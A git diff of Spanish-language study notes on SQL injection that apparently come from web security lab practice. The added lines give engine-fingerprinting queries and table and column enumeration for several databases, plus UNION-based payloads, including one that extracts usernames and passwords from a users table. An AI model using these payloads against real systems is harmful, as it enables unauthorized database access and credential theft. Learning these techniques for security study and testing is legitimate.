@@ -44,11 +44,24 @@ _COMO SABER EL DATA TYPE DE UNA COLUMNA ?
 
 _IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS [TIPO/VERSION] 
 
-  NOTA: debe ser UNION attack. numero de columnas se respeta.
-
 Microsoft >> SELECT @@version \
 MySQL >> SELECT @@version \
 Oracle >> SELECT banner FROM v$version | SELECT version FROM v$instance \
-PostgreSQL >> SELECT version()
+PostgreSQL >> SELECT version()\
 
+_LISTAR TABLAS DE LA BASE DE DATOS / [Microsoft/MySQL/PostgreSQL]\
 
+SELECT [columns] FROM information_schema.tables | '+UNION+SELECT+table_name,null+FROM+information_schema.tables--\
+SELECT [columns] FROM information_schema.columns\
+
+SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm'\
+
+_LISTAR TABLAS DE LA BASE DE DATOS / [Oracle]\
+
+SELECT [columns] FROM all_tables\
+
+SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS'\
+
+_MOSTRAR INFORMACION DE OTRAS TABLAS [importante!]
+
+' UNION SELECT username, password FROM users-- | retrieve the username and password from table "users"
